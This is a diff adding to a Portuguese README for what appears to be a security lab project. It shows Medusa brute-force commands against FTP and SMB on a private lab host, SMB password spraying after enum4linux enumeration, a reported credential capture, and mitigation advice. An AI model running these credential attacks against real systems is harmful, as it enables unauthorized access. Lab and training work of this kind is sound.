@@ -21,3 +21,27 @@ Este projeto demonstra a execução de ataques de **força bruta** utilizando a 
 1. **Ataque de Força Bruta em FTP**
    ```bash
    medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp
+
+2. **Automação em Formulário Web (DVWA)**
+
+  Teste de login com Medusa ou Hydra.
+
+4. **Password Spraying em SMB com Enumeração**
+  ```bash
+  enum4linux -a 192.168.56.101
+  medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt
+  ```
+
+
+🔍 Resultados
+
+Foram obtidas credenciais válidas em serviços vulneráveis.
+Prints das execuções estão disponíveis na pasta /images.
+
+
+🛡️ Recomendações de Mitigação
+
+Implementar políticas de senha forte.
+Configurar bloqueio após tentativas falhas.
+Utilizar autenticação multifator (MFA).
+Monitorar logs e alertas de tentativas suspeitas.
